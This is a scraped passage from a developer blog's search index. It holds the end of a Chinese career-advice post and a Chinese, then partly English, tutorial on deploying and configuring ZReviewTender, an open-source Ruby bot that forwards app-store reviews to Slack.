Engineer，選擇加入具新創文化而非一般傳統大公司的原因…?個人體驗，新創文化(also in Pinkoi)有五個特性： 透明 公司的營運狀況、決策跟未來規劃，所有人都能清楚知道 平等 扁平化管理，不會有階級壓力不分職務大家都能表達意見、參與討論 視野 跟隨團隊一同成長，從小團隊到國際化團隊，增進視野結合透明與平等，能了解更多方面的眉眉角角 彈性 - 工作上的彈性：上班時間、WFH 的彈性或溝通協作上都有很多彈性討論空間- 職務上的彈性：有更多嘗試不同可能的彈性更多升遷的彈性 活躍 平均年齡相對年輕有活力，更容易產生共鳴迸出火花，也較容易推動、接納改變這些特性，以往在傳統大公司就比較不容易看到，傳統公司多半比較封閉跟一版一眼，很難有提議空間，能看到跟做的事也很有限，對於新的改變嘗試也比較排斥；對有活力的新鮮人來說相對比較難發揮。給想當軟體工程師的新鮮人一點建議…工程師 28 歲 v.s. 工程師 46 歲 (Elon Musk 也曾是工程師)；雖然是梗圖，但想表達的是要成為怎麼樣的工程師，都是由你自己決定。給想當軟體工程師的新鮮人一點建議…除了精實開發能力之外，我覺得更重要的是心態問題，人生是一場旅程，有很多階段與角色需要完成；第一個是需要時時刻刻跳脫舒適圈，持續準備好面對更高的挑戰；像我最一開始其實後端工程師，後來轉 iOS 開發，現在開始挑戰管理職。第二是方向的探索，不要畫地自限，每個人都有無限可能，可以持續調整找到適合自己的方向，在拿手領域發光發熱；我們有隊友也是後期才轉職工程師或是從設計師轉職 PM，另外也可以想一下自己 30 歲、 40 歲想成為什麼角色，例如：繼續鑽研技術變架構師/Tech Lead，或是改擔任管理職。還有終身學習，學無止盡，尤其我們是資訊行業，千變萬化，如果沒有求新求變很容易被業界淘汰最後一點也很重要，要保持工作與生活的平衡，Work Hard, Play Hard 除了能提升工作效率，也能從生活經驗汲取工作靈感，如同前面所說，也許一個小創意就能改變世界、創造更高的商業價值！建議新鮮人 謹慎選擇 前幾份工作，初出社會沈默成本很低；可以先以能學到東西為找工作第一考量，盡量先選擇加入自己有做產品的公司 (e.g. Pinkoi /Line/StreetVoice…) 並不要太頻繁地更換職務 (至少待個一年起)，對未來職涯會很有幫助。 人生路還很長，希望大家找到屬於自己的路，謝謝。立即加入 Pinkoi &gt;&gt;&gt; https://www.pinkoi.com/about/careers花絮有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 225 Total Views Last Statistics Date: 2025-08-15 | 153 Views on Medium." }, { "title": "ZReviewTender — 免費開源的 App Reviews 監控機器人", "url": "/posts/zrealm-dev/zreviewtender-%E5%85%8D%E8%B2%BB%E9%96%8B%E6%BA%90%E7%9A%84-app-reviews-%E7%9B%A3%E6%8E%A7%E6%A9%9F%E5%99%A8%E4%BA%BA-e36e48bb9265/", "categories": "ZRealm Dev.", "tags": "ios-app-development, app-store, google-play, app-review, automation", "date": "2022-08-10 19:56:05 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.ZReviewTender — 免費開源的 App Reviews 監控機器人實時監測 App 的最新評價內容並即時給予反饋，提升協作效率及消費者滿意度ZhgChgLi / ZReviewTenderZhgChgLi / ZR...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.ZReviewTender — 免費開源的 App Reviews 監控機器人實時監測 App 的最新評價內容並即時給予反饋，提升協作效率及消費者滿意度ZhgChgLi / ZReviewTenderZhgChgLi / ZReviewTenderApp Reviews to Slack ChannelZReviewTender — 為您自動監控 App Store iOS/macOS App 與 Google Play Android App 的使用者最新評價訊息，並提供持續整合工具，串接進團隊工作流程，提升協作效率及消費者滿意度。特色功能 取得 App Store iOS/macOS App 與 Google Play Android App 評價列表並篩選出尚未爬取過的最新評價內容 [預設功能] 轉發爬取到的最新評價到 Slack，點擊訊息 Timestamp 連結能快速進入後台回覆評價 [預設功能] 支援使用 Google Translate API 自動翻譯非指定語系、地區的評價內容成您的語言 [預設功能] 支援自動記錄評價到 Google Sheet 支援彈性擴充，除包含的預設功能外您仍可依照團隊工作流程，自行開發所需功能並整合進工具中 e.g. 轉發評價到 Discord, Line, Telegram… 使用時間戳紀錄爬取位置，防止重複爬取評價 支援過濾功能，可指定只爬取 多少評分、評價內容包含什麼關鍵字、什麼地區/語系 的評價 Apple 基於 全新的 App Store Connect API ，提供穩定可靠的 App Store App 評價資料來源，不再像 以往使用 XML 資料不可靠 or Fastlane Spaceship Session 會過期需定時人工維護 Android 同樣使用官方 AndroidpublisherV3 API 撈取評價資料 支援使用 Github Repo w/ Github Action 部署，讓您免費快速的建立 ZReviewTender App Reviews 機器人 100% Ruby @ RubyGemTL;DR [2024/09/27] Update 整理快速部署教學文件，請參考最新文章：[Quick Start! ] Github Action x ZReviewTender 免費快速部署你的 App 商城評價監控機器人。與類似服務比較App Reviews 工作流程整合範例 (in Pinkoi)問題：商城的評價對產品很重要但他卻是一個非常人工跟重複轉介溝通的事。因為要時不時人工上去看一下新評價，如過有客服問題再將問題轉發給客服協助處理，很重複、人工。透過 ZReviewTender 評價機器人，將評價自動轉發到 Slack Channel，大家能快速收到最新評價資訊，並即時追蹤、討論；也能讓整個團隊了解目前使用者對產品的評價、建議。更多資訊可參考： 2021 Pinkoi Tech Career Talk — 高效率工程團隊大解密 。部署 — 只使用預設功能如果您只需要 ZReviewTender 自帶的預設功能 (to Slack/Google Translate/Filter) 則可使用以下快速部署方式。ZReviewTender 已打包發佈到 RubyGems ，您可以快速方便的使用 RubyGems 安裝使用 ZReviewTender。[推薦] 直接使用 Github Repo Template 部署 無需任何主機空間 ✅ 無需任何環境要求 ✅ 無需了解工程原理 ✅ 完成 Config 檔案配置即完成部署 ✅ 8 個步驟即可完成部署 ✅ 完全免費 ✅Github Action 提供每個帳號 2,000+分鐘/月 執行用量，執行一次 ZReviewTender 評價撈取約只需要 15~30 秒。預設每 6 小時執行一次，一天執行 4 次， 一個月約只消耗 60 分鐘額度 。Github Private Repo 免費無限制建立。1.前往 ZReviewTender Template Repo: ZReviewTender-deploy-with-github-action點擊右上方「Use this template」按鈕。2. 建立 Repo Repository name: 輸入你想要的 Repo 專案名稱 Access: Private ⚠️⚠️ 請務必建立 Private Repo ⚠️⚠️ 因為你將上傳設定及私密金鑰到專案中最後點擊下方「Create repository from template」按鈕。3. 確認你建立的 Repo 是 Private Repo確認右上方 Repo 名稱有出現「🔒」和 Private 標籤。若無則代表您建立的事 Public Repo 非常危險 ，請前往上方 Tab「Settings」-&gt; 「General」-&gt; 底部「Danger Zone」-&gt; 「Change repository visibility」-&gt;「Make private」 改回 Private Repo 。4. 等待 Project init 成功可在 Repo 首頁 Readme 中的區塊查看 Badge，如果 passing 即代表 init 成功。或是點擊上方 Tab「Actions」-&gt; 等待「Init ZReviewTender」Workflow 執行完成：執行完成狀態會變 3「✅ Init ZReviewTender」-&gt; Project init 成功。5. 確認 init 檔案及目錄是否正確建立點擊上方 Tab「Code」回到專案目錄，Project init 成功的話會出現: 目錄： config/ 檔案： config/android.yml 檔案： config/apple.yml 目錄： latestCheckTimestamp/ 檔案： latestCheckTimestamp/.keep6. 完成 Configuration 配置好 android.yml &amp; apple.yml進入 config/ 目錄完成 android.yml &amp; apple.yml 檔案配置。點擊進入要編輯的 confi YML 檔案點擊右上方「✏️」編輯檔案。參考本文下方「 設定 」區塊完成配置好 android.yml &amp; apple.yml 。編輯完成後可以直接在下方「Commit changes」儲存設定。上傳相應的 Key 檔案到 config/ 目錄下:在 config/ 目錄下，右上角選擇「Add file」-&gt;「Upload files」將 config yml 裡配置的相應 Key、外部檔案路徑一併上傳到 config/ 目錄下，拖曳檔案到「上方區塊」-&gt; 等待檔案上傳完成 -&gt; 下方直接「Commit changes」儲存。上傳完成後回到 /config 目錄查看檔案是否正確儲存&amp;上傳。7. 初始化 ZReviewTender (手動觸發執行一次)點擊上方 Tab「Actions」-&gt; 左方選擇「ZReviewTender」-&gt; 右方按鈕選擇「Run workflow」-&gt; 點擊「Run workflow」按鈕執行一次 ZReviewTender。點擊後，重新整理網頁 會出現：點擊「ZReviewTender」可進入查看執行狀況。展開「 Run ZreviewTender -r 」區塊可查看執行 Log。這邊可以看到出現 Error，因為我還沒配置好我的 config yml 檔案。回頭調整好 android/apple config yml 後再回到 6. 步驟一開始重新觸發執行一次。查看 「 ZReviewTender -r 」區塊的 log 確認執行成功！Slack 指定接收最新評價訊息的 Channel 也會出現 init Success 成功訊息 🎉8. Done! 🎉 🎉 🎉配置完成！爾後每 6 個小時會自動爬取期間內的最新評價並轉發到你的 Slack Channel 中！可在 Repo 首頁 Readme 中的頂部查看最新一次執行狀況：若出現 Error 即代表執行發生錯誤，請從 Acions -&gt; ZReviewTender 進入查看紀錄；如果有意外的錯誤，請 建立一個 Issue 附上紀錄資訊，將會盡快修正！ ❌❌❌執行發生錯誤同時 Github 也會寄信通知，不怕發生錯誤機器人掛掉但沒人發現！Github Action 調整您還可以依照自己需求配置 Github Action 執行規則。點擊上方 Tab「Actions」-&gt; 左方「ZReviewTender」-&gt; 右上方「 ZReviewTender.yml 」點擊右上方「✏️」編輯檔案。有兩個參數可供調整：cron : 設定多久檢查一次有無新評價，預設是 15 */6 * * * 代表每 6 小時 15 分鐘會執行一次。可參考 crontab.guru 依照自己的需求配置。 請注意： 1. Github Action 使用的是 UTC 時區 2. 執行頻率越高會消耗越多Github Action 執行額度run : 設定要執行的指令，可參考本文下方「 執行 」區塊，預設是 ZReviewTender -r 預設執行 Android App &amp; Apple(iOS/macOS App)： ZReviewTender -r 只執行 Android App： ZReviewTender -g 只執行 Apple(iOS/macOS App) App： ZReviewTender -a編輯完成後點擊右上方「Start commit」選擇「Commit changes」儲存設定。手動觸發執行 ZReviewTender參考前文「6. 初始化 ZReviewTender (手動觸發執行一次)」使用 Gem 安裝如果熟悉 Gems 可以直接使用以下指令安裝 ZReviewTendergem install ZReviewTender使用 Gem 安裝 (不熟悉 Ruby/Gems)如果不熟悉 Ruby or Gems 可以 Follow 以下步驟 Step by Step 安裝 ZReviewTender macOS 雖自帶 Ruby，但建議使用 rbenv or rvm 安裝新的 Ruby 及管理 Ruby 版本 (我使用 2.6.5 ) 使用 rbenv or rvm 安裝 Ruby 2.6.5，並切換至 rbenv/rvm 的 Ruby 使用 which ruby 確認當前使用的 Ruby 非 /usr/bin/ruby 系統 Ruby Ruby 環境 Ok 後使用以下指令安裝 ZReviewTendergem install ZReviewTender部署 — 想自行擴充功能手動 git clone ZReviewTender Source Code 確認 &amp; 完善 Ruby 環境 進入目錄，執行 bundle install ZReviewTender 安裝相關依賴Processor 建立方式可參考後面文章內容。設定ZReviewTender — 使用 yaml 檔設定 Apple/Google 評價機器人。[推薦] 直接使用文章下方的執行指令 — 「產生設定檔案」:ZReviewTender -i直接產生空白的 apple.yml &amp; android.yml 設定檔。Apple (iOS/macOS App)參考 apple.example.yml 檔案： ⚠️ 下載下來 apple.example.yml 後記得將檔名改成 apple.ymlapple.yml:platform: 'apple'appStoreConnectP8PrivateKeyFilePath: '' # APPLE STORE CONNECT API PRIVATE .p8 KEY File PathappStoreConnectP8PrivateKeyID: '' # APPLE STORE CONNECT API PRIVATE KEY IDappStoreConnectIssueID: '' # APPLE STORE CONNECT ISSUE IDappID: '' # APP ID...appStoreConnectIssueID： App Store Connect -&gt; Keys -&gt; App Store Connect API Issuer ID: appStoreConnectIssueIDappStoreConnectP8PrivateKeyID &amp; appStoreConnectP8PrivateKeyFilePath： Name: ZReviewTender Access: App Manager appStoreConnectP8PrivateKeyID: Key ID appStoreConnectP8PrivateKeyFilePath: /AuthKey_XXXXXXXXXX.p8 ，Download API Key，並將檔案放入與 config yml 同目錄下。appID:appID: App Store Connect -&gt; App Store -&gt; General -&gt; App Information -&gt; Apple IDGCP Service AccountZReviewTender 所使用到的 Google API 服務 (撈取商城評價、Google 翻譯、Google Sheet) 都是使用 Service Account 驗證方式。可先依照 官方步驟建立 GCP &amp; Service Account 下載保存 GCP Service Account 身份權限金鑰 ( *.json )。 如要使用自動翻譯功能請確認 GCP有啟用 Cloud Translation API 和使用的 Service Account 也有加入 如要使用記錄到 Google Sheet 功能請確認 GCP 有啟用 Google Sheets API 、 Google Drive API 和使用的 Service Account 也有加入Google Play Console (Android App)參考 android.example.yml 檔案： ⚠️ 下載下來 android.example.yml 後記得將檔名改成 android.ymlandroid.yml:platform: 'android'packageName: '' # Android App Package NamekeyFilePath: '' # Google Android Publisher API Credential .json File PathplayConsoleDeveloperAccountID: '' # Google Console Developer Account IDplayConsoleAppID: '' # Google Console App ID......packageName:packageName: com.XXXXX 可於 Google Play Console -&gt; Dashboard -&gt; App 中取得playConsoleDeveloperAccountID &amp; playConsoleAppID:可由 Google Play Console -&gt; Dashboard -&gt; App 頁面網址中取得：https://play.google.com/console/developers/ playConsoleDeveloperAccountID /app/ playConsoleAppID /app-dashboard將用於組合評價訊息連結，讓團隊可以點擊連結快速進入後台評價回覆頁面。keyFilePath:最重要的資訊，GCP Service Account 身份權限金鑰 ( *.json )需要按照 官方文件 步驟，建立 Google Cloud Project &amp; Service Account 並到 Google Play Console -&gt; Setup -&gt; API Access 中完成啟用 Google Play Android Developer API ＆連結專案，到 GCP 點擊下載服務帳戶的 JSON 金鑰。JSON 金鑰範例內容如下：gcp_key.json:{ \"type\": \"service_account\", \"project_id\": \"XXXX\", \"private_key_id\": \"XXXX\", \"private_key\": \"-----BEGIN PRIVATE KEY-----\\nXXXX\\n-----END PRIVATE KEY-----\\n\", \"client_email\": \"XXXX@XXXX.iam.gserviceaccount.com\", \"client_id\": \"XXXX\", \"auth_uri\": \"https://accounts.google.com/o/oauth2/auth\", \"token_uri\": \"https://oauth2.googleapis.com/token\", \"auth_provider_x509_cert_url\": \"https://www.googleapis.com/oauth2/v1/certs\", \"client_x509_cert_url\": \"https://www.googleapis.com/robot/v1/metadata/x509/XXXX.iam.gserviceaccount.com\"} keyFilePath: /gcp_key.json 金鑰檔案路徑，將檔案放入與 config yml 同目錄下。Processorsprocessors: - FilterProcessor: class: \"FilterProcessor\" enable: true # enable keywordsInclude: [] # keywords you want to filter out ratingsInclude: [] # ratings you want to filter out territoriesInclude: [] # territories you want to filter out - GoogleTranslateProcessor: # Google Translate Processor, will translate review text to your language, you can remove whole block if you don't needed it. class: \"GoogleTranslateProcessor\" enable: false # enable googleTranslateAPIKeyFilePath: '' # Google Translate API Credential .json File Path googleTranslateTargetLang: 'zh-TW' # Translate to what Language googleTranslateTerritoriesExclude: [\"TWN\",\"CHN\"] # Review origin Territory (language) that you don't want to translate. - SlackProcessor: # Slack Processor, resend App Review to Slack. class: \"SlackProcessor\" enable: true # enable slackTimeZoneOffset: \"+08:00\" # Review Created Date TimeZone slackAttachmentGroupByNumber: \"1\" # 1~100, how many review message in 1 slack message. slackBotToken: \"\" # Slack Bot Token, send slack message throught Slack Bot. slackBotTargetChannel: \"\" # Slack Bot Token, send slack message throught Slack Bot. (recommended, first priority) slackInCommingWebHookURL: \"\" # Slack In-Comming WebHook URL, Send slack message throught In-Comming WebHook, not recommended, deprecated. ...More Processors...ZReviewTender 自帶四個 Processor，先後順序會影響到資料處理流程 FilterProcessor-&gt;GoogleTranslateProcessor-&gt;SlackProcessor-&gt; GoogleSheetProcessor。FilterProcessor:依照指定條件過濾撈取的評價，只處理符合條件的評價。 class: FilterProcessor 無需調整，指向 lib/Processors/ FilterProcessor .rb enable: true / false 啟用此 Processor or Not keywordsInclude: [“ 關鍵字1 ”,“ 關鍵字2 ”…] 篩選出內容包含這些關鍵字的評價 ratingsInclude: [ 1 , 2 …] 1~5 篩選出包含這些評價分數的評價 territoriesInclude: [“ zh-hant ”,” TWN ”…] 篩選出包含這些地區(Apple)或語系(Android)的評價GoogleTranslateProcessor:將評價翻譯成指定語言。 class: GoogleTranslateProcessor 無需調整，指向 lib/Processors/ GoogleTranslateProcessor .rb enable: true / false 啟用此 Processor or Not googleTranslateAPIKeyFilePath: /gcp_key.json GCP Service Account 身份權限金鑰 File Path *.json ，將檔案放入與 config yml 同目錄下，內容範例可參考上方 Google Play Console JSON 金鑰範例。(請確認該 JSON key 之 service account 有 Cloud Translation API 使用權限) googleTranslateTargetLang: zh-TW 、 en …目標翻譯語言 googleTranslateTerritoriesExclude: [“ zh-hant ”,” TWN ”…] 不需翻譯的地區(Apple)或語系(Android)SlackProcessor:轉發評價到 Slack。 class: SlackProcessor 無需調整，指向 lib/Processors/ SlackProcessor .rb enable: true / false 啟用此 Processor or Not slackTimeZoneOffset: +08:00 評價時間顯示時區 slackAttachmentGroupByNumber: 1 設定幾則 Reviews 合併成同一則訊息，加速發送；預設 1 則 Review 1 則 Slack 訊息。 slackBotToken: xoxb-xxxx-xxxx-xxxx Slack Bot Token ，Slack 建議建立一個 Slack Bot 包含 postMessages Scope 並使用其發送 Slack 訊息 slackBotTargetChannel: CXXXXXX 群組 ID ( 非群組名稱 )，Slack Bot 要發送到哪個 Channel 群組；且 需要把你的 Slack Bot 加入到該群組 slackInCommingWebHookURL: https://hooks.slack.com/services/XXXXX 使用舊的 InComming WebHookURL 發送訊息到 Slack，注意！Slack 不建議再繼續使用此方法發送訊息。 Please note, this is a legacy custom integration — an outdated way for teams to integrate with Slack. These integrations lack newer features and they will be deprecated and possibly removed in the future. We do not recommend their use. Instead, we suggest that you check out their replacement: Slack apps . slackBotToken 與 slackInCommingWebHookURL，SlackProcessor 會優選選擇使用 slackBotTokenGoogleSheetProcessor紀錄評價到 Google Sheet。 class: GoogleSheetProcessor 無需調整，指向 lib/Processors/ SlackProcessor .rb enable: true / false 啟用此 Processor or Not googleSheetAPIKeyFilePath: /gcp_key.json GCP Service Account 身份權限金鑰 File Path *.json ，將檔案放入與 config yml 同目錄下，內容範例可參考上方 Google Play Console JSON 金鑰範例。(請確認該 JSON key 之 service account 有 Google Sheets API 、 Google Drive API 使用權限) googleSheetTimeZoneOffset: +08:00 評價時間顯示時區 googleSheetID: Google Sheet ID 可由 Google Sheet 網址中取得：https://docs.google.com/spreadsheets/d/ googleSheetID / googleSheetName: Sheet 名稱, e.g. Sheet1 keywordsInclude: [“ 關鍵字1 ”,“ 關鍵字2 ”…] 篩選出內容包含這些關鍵字的評價 ratingsInclude: [ 1 , 2 …] 1~5 篩選出包含這些評價分數的評價 territoriesInclude: [“ zh-hant ”,” TWN ”…] 篩選出包含這些地區(Apple)或語系(Android)的評價 values: [ ] 評價資訊的欄位組合%TITLE% 評價標題%BODY% 評價內容%RATING% 評價分數 1~5%PLATFORM% 評價來源平台 Apple or Android%ID% 評價ID%USERNAME% 評價%URL% 評價前往連結%TERRITORY% 評價地區(Apple)或評價語系(Android)%APPVERSION% 被評價的 App 版本%CREATEDDATE% 評價建立日期例如我的 Google Sheet 欄位如下：評價分數,評價標題,評價內容,評價資訊則 values 可設定成：values: [\"%TITLE%\",\"%BODY%\",\"%RATING%\",\"%PLATFORM% - %APPVERSION%\"]自訂 Processor 串接自己的工作流程若需要自訂 Processor 請改用手動部署，因 gem 上的 ZReviewTender 已打包無法動態調整。您可參考 lib/Processors/ProcessorTemplate.rb 建立您的擴充功能:$lib = File.expand_path('../lib', File.dirname(__FILE__))require \"Models/Review\"require \"Models/Processor\"require \"Helper\"require \"ZLogger\"# Add to config.yml:## processors:# - ProcessorTemplate:# class: \"ProcessorTemplate\"# parameter1: \"value\"# parameter2: \"value\"# parameter3: \"value\"# ...#class ProcessorTemplate &lt; Processor def initialize(config, configFilePath, baseExecutePath) # init Processor # get paraemter from config e.g. config[\"parameter1\"] # configFilePath: file path of config file (apple.yml/android.yml) # baseExecutePath: user excute path end def processReviews(reviews, platform) if reviews.length &lt; 1 return reviews end ## do what your want to do with reviews... ## return result reviews return reviews endendinitialize 會給予: config Object: 對應 config yml 內的設定值 configFilePath: 使用的 config yml 檔案路徑 baseExecutePath: 使用者在哪個路徑執行 ZReviewTenderprocessReviews(reviews, platform):爬取完新評價後，會進入這個 function 讓 Processor 有機會處理，處理完請 return 結果的 Reviews。Review 資料結構定義在 lib/Models/ Review.rb附註XXXterritorXXX 參數： Apple 使用地區：TWM/JPN… Android 使用語系：zh-hant/en/…若不需要某個 Processor： 可以設定 enable: false 或是直接移除該 Processor Config Block。Processors 執行順序可依照您的需求自行調整： e.g. 先執行 Filter 再執行翻譯再執行 Slack 再執行 Log to Google Sheet…執行 ⚠️ 使用 Gem 可直接下 ZReviewTender ，若為手動部署專案請使用 bundle exec ruby bin/ZReviewTender 執行。產生設定檔案：ZReviewTender -i從 apple.example.yml &amp; android.example.yml 產生 apple.yml &amp; android.yml 到當前執行目錄的 config/ 目錄下。執行 Apple &amp; Android 評價爬取：ZReviewTender -r 默認讀取 /config/ 下 apple.yml &amp; android.yml 設定執行 Apple &amp; Android 評價爬取 &amp; 指定設定檔目錄：ZReviewTender --run=設定檔目錄 默認讀取 /config/ 下 apple.yml &amp; android.yml 設定只執行 Apple 評價爬取：ZReviewTender -a 默認讀取 /config/ 下 apple.yml 設定只執行 Apple 評價爬取 &amp; 指定設定檔位置：ZReviewTender --apple=apple.yml設定檔位置只執行 Android 評價爬取：ZReviewTender -g 默認讀取 /config/ 下 android.yml 設定只執行 Android 評價爬取 &amp; 指定設定檔位置：ZReviewTender --googleAndroid=android.yml設定檔位置清除執行紀錄回到初始設定ZReviewTender -d會刪除 /latestCheckTimestamp 裡的 Timestamp 紀錄檔案，回到初始狀態，再次執行爬取會再次收到 init success 訊息:當前 ZReviewTender 版本ZReviewTender -v顯示當前 ZReviewTender 再 RubyGem 上的最新版本號。更新 ZReviewTender 到最新版 (rubygem only)ZReviewTender -n第一次執行第一次執行成功會發送初始化成功訊息到指定 Slack Channel，並在執行相應目錄下產生 latestCheckTimestamp/Apple , latestCheckTimestamp/Android 檔案紀錄最後爬取的評價 Timestamp。另外還會產生一個 execute.log 紀錄執行錯誤。設定排程持續執行設定排程定時( crontab )持續執行爬取新評價，ZReviewTender 會爬取 latestCheckTimestamp 上次爬取的評價 Timestamp 到這次爬取時間內的新評價，並更新 Timestamp 紀錄檔案。e.g. crontab: 15 */6 * * * ZReviewTender -r另外要注意因為 Android API 只提供查詢近 7 天新增或編修的評價，所以排成週期請勿超過 7 天，以免有評價遺漏。https://developers.google.com/android-publisher/reply-to-reviews#retrieving_a_set_of_reviewsGithub Action 部署ZReviewTender App Reviews Automatic Botname: ZReviewTenderon: workflow_dispatch: schedule: - cron: \"15 */6 * * *\" #每六小時跑一次，可參照上方 crontab 自行更改設定jobs: ZReviewTender: runs-on: ubuntu-latest steps: - name: ZReviewTender Automatic Bot uses: ZhgChgLi/ZReviewTender@main with: command: '-r' #執行 Apple &amp; iOS App 評價檢查，可參照上方改成其他執行指令⚠️️️️️ 再次警告！務必確保你的設定檔及金鑰無法被公開存取，因其中的敏感資訊可能導致 App/Slack 權限被盜用；作者不對被盜用負任何責任。如果有發生意外的錯誤，請 建立一個 Issue 附上紀錄資訊，將會盡快修正！Done使用教學結束，再來是幕後開發祕辛分享。=========================與 App Reviews 的戰爭本以為去年總結的 AppStore APP’s Reviews Slack Bot 那些事 及運用相關技術實現的 ZReviewsBot — Slack App Review 通知機器人 ，與整合 App 最新評價進入公司工作流程這件事就告一段落了；沒想到 Apple 居然在今年 更新了 App Store Connect API ，讓這件事能持續演進。去年總結出來的 Apple iOS/macOS App 撈取評價的解決方案： Public URL API (RSS) ⚠️: 無法彈性篩選、給的資訊也少、有數量上限、還有我們偶爾會遇到資料錯亂問題，很不穩定；官方未來可能棄用 透過 Fastlane — SpaceShip 幫我們封裝複雜的網頁操作、Session 管理，去 App Store Connection 網站後台撈取評價資料 (等於是起一個網頁模擬器爬蟲去後台爬資料)。依照去年做法就只能使用方法二來達成，但效果不太完美；Session 會過期，需要人工定期更新，且無法放在 CI/CD Server 上，因為 IP 一變 Session 會馬上過期。important-note-about-session-duration by Fastlane今年收到 Apple 更新了 App Store Connect API 消息後立馬著手重新設計新的評價機器人，除了改用官方 API 外；還優化了之前的架構設計及更熟悉 Ruby 用法。App Store Connect API 開發上遇到的問題 List All Customer Reviews for an App 這個 Endpoint 不會給 App 版本資訊很詭異，只能 workaround 先打這個 endpoint 篩出最新評價，再打 List All App Store Versions for an App &amp; List All Customer Reviews for an App Store Version 組合出 App 版本資訊。AndroidpublisherV3 開發上遇到的問題 API 不提供取得所有評價列表的方法，只能取得近 7 天新增/編修的評價。 同樣使用 JWT 串接 Google API (不依賴相關類別庫 e.g. google-apis-androidpublisher_v3) 附上個 Google API JWT 產生&amp;使用範例：require \"jwt\"require \"time\"payload = { iss: \"GCP API 身份權限金鑰 (*.json) 檔案中的 client_email 欄位\", sub: \"GCP API 身份權限金鑰 (*.json) 檔案中的 client_email 欄位\", scope: [\"https://www.googleapis.com/auth/androidpublisher\"]].join(' '), aud: \"GCP API 身份權限金鑰 (*.json) 檔案中的 token_uri 欄位\", iat: Time.now.to_i, exp: Time.now.to_i + 60*20}rsa_private = OpenSSL::PKey::RSA.new(\"GCP API 身份權限金鑰 (*.json) 檔案中的 private_key 欄位\")token = JWT.encode payload, rsa_private, 'RS256', header_fields = {kid:\"GCP API 身份權限金鑰 (*.json) 檔案中的 private_key_id 欄位\", typ:\"JWT\"}uri = URI(\"API 身份權限金鑰 (*.json) 檔案中的 token_uri 欄位\")https = Net::HTTP.new(uri.host, uri.port)https.use_ssl = truerequest = Net::HTTP::Post.new(uri)request.body = \"grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Ajwt-bearer&amp;assertion=#{token}\"response = https.request(request).read_bodybearer = result[\"access_token\"]### use bearer tokenuri = URI(\"https://androidpublisher.googleapis.com/androidpublisher/v3/applications/APP_PACKAGE_NAME/reviews\")https = Net::HTTP.new(uri.host, uri.port)https.use_ssl = true request = Net::HTTP::Get.new(uri)request['Authorization'] = \"Bearer #{bearer}\"; response = https.request(request).read_body result = JSON.parse(response)# success!有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 1,252 Total Views Last Statistics Date: 2025-08-15 | 1,014 Views on Medium." }, { "title": "ZReviewTender — A Free and Open Source App Reviews Monitoring Bot", "url": "/posts/zrealm-dev/en/zreviewtender-a-free-and-open-source-app-reviews-monitoring-bot-e36e48bb9265/", "categories": "ZRealm Dev.", "tags": "ios-app-development, app-store, google-play, app-review, automation", "date": "2022-08-10 19:56:05 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版ZReviewTender — A Free and Open Source App Reviews Monitoring BotReal-time monitorin...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版ZReviewTender — A Free and Open Source App Reviews Monitoring BotReal-time monitoring of the latest app reviews with instant feedback to enhance collaboration efficiency and consumer satisfaction.ZhgChgLi / ZReviewTenderZhgChgLi / ZReviewTenderApp Reviews to Slack ChannelZReviewTender — Automatically monitors user reviews for iOS/macOS apps on the App Store and Android apps on Google Play, providing continuous integration tools that integrate into team workflows to enhance collaboration efficiency and consumer satisfaction.Key Features Retrieve review lists for iOS/macOS apps on the App Store and Android apps on Google Play, filtering for the latest reviews that haven’t been crawled yet. [Default Feature] Forward the latest crawled reviews to Slack, with clickable message timestamps for quick access to the backend for responding to reviews. [Default Feature] Support for automatic translation of reviews in non-specified languages or regions using the Google Translate API. [Default Feature] Automatically log reviews to Google Sheets. Flexible expansion: In addition to the default features, you can develop and integrate custom functionalities according to your team’s workflow, e.g., forwarding reviews to Discord, Line, Telegram, etc. Use timestamps to record crawl locations, preventing duplicate reviews from being crawled. Support filtering options to specify which ratings, keywords, or regions/languages to crawl. Apple provides a stable and reliable source of App Store app review data based on the new App Store Connect API, eliminating the unreliability of previous XML data or the need for manual maintenance of Fastlane Spaceship sessions. Android uses the official AndroidpublisherV3 API to fetch review data. Supports deployment using GitHub Repo with GitHub Actions, allowing you to quickly and freely set up the ZReviewTender App Reviews bot. 100% Ruby @ RubyGemTL;DR [2024/09/27] Update For a quick deployment guide, please refer to the latest article: [Quick Start!] GitHub Action x ZReviewTender - Free and Fast Deployment of Your App Store Review Monitoring Bot.Comparison with Similar ServicesExample of App Reviews Workflow Integration (in Pinkoi)Problem:Reviews in the marketplace are crucial for products, but managing them is a repetitive and manual task.It often requires manual checking for new reviews and forwarding any customer service issues to the support team, which is tedious and labor-intensive.With the ZReviewTender review bot, reviews are automatically forwarded to a Slack channel, allowing everyone to quickly receive the latest review information, track discussions in real-time, and keep the entire team informed about user feedback and suggestions.For more information, refer to: 2021 Pinkoi Tech Career Talk — Secrets of an Efficient Engineering Team.Deployment — Using Only Default FeaturesIf you only need the default features of ZReviewTender (to Slack/Google Translate/Filter), you can use the following quick deployment method.ZReviewTender is packaged and published on RubyGems, allowing you to easily install and use ZReviewTender.[Recommended] Directly Use GitHub Repo Template for Deployment No need for any hosting space ✅ No environmental requirements ✅ No need to understand engineering principles ✅ Complete configuration of the config file to finish deployment ✅ Deployment can be completed in 8 steps ✅ Completely free ✅GitHub Actions provides each account with 2,000+ minutes/month of execution time, and running ZReviewTender to fetch reviews takes about 15-30 seconds.By default, it runs every 6 hours, totaling about 4 times a day, consuming only about 60 minutes of quota per month.You can create unlimited private GitHub repos for free. Go to the ZReviewTender Template Repo: ZReviewTender-deploy-with-github-actionClick the “Use this template” button in the upper right corner. Create a Repo Repository name: Enter your desired repo project name Access: Private ⚠️⚠️ Please ensure to create a Private Repo ⚠️⚠️ Because you will upload configuration and secret keys to the project.Finally, click the “Create repository from template” button at the bottom. Confirm that your 